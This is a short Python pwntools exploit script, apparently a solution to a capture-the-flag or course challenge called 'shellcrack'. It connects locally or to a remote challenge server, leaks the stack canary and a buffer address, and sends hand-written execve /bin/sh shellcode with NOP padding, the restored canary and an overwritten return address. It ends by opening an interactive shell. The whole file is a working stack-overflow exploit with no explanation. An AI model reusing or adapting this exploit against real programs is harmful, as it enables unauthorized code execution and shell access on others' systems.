#!/usr/bin/env python2.7

from pwn import *

def start():
    global p
    global elf
    prog  = "./shellcrack"    

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 5001

        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

start()

p.sendlineafter("as:", "A" * 0xF)

# Grab the leaked canary
p.recvuntil("A\n")
canary = p.recvuntil("!", drop=True)
 
# Grab the leaked buffer address
p.recvuntil("[")
address = int(p.recvuntil("]", drop=True), 16)

# payload to execve /bin/sh
payload = asm("""
    push 0x0068732f
    push 0x6e69622f

    mov eax, 0xb
    mov ebx, esp
    mov ecx, 0x0
    mov edx, 0x0

    int 0x80
""")
payload += b"\x90" * (0x48 - 0x18 - len(payload))
payload += canary
payload += b"\x90" * (0x18 - len(canary))
payload += p32(address)

p.sendline(payload)

p.interactive()
p.close()